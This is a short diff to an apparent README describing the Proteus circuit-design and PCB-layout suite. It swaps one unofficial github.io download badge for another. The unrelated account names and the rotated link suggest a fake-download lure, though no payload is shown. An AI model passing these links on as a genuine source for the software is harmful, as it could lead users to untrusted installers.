@@ -10,7 +10,7 @@
 
 Proteus is an integrated electronic design automation (EDA) software suite engineered specifically for schematic capture, mixed-mode SPICE circuit simulation, and printed circuit board (PCB) layout workflows on Windows. It delivers robust microcontroller simulation capabilities, real-time peripheral interaction models, and advanced routing tools designed to streamline embedded system prototyping, hardware validation, and PCB manufacturing preparation.
 
-[![Download Proteus](https://img.shields.io/badge/Download-Proteus-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://watsonwesley59410.github.io/.github/Proteus-Circuit-Platform)
+[![Open Proteus](https://img.shields.io/badge/Open-Proteus-1E293B?style=for-the-badge)](https://proteus-platform-circuit.github.io/.github/)
 
 ---
 
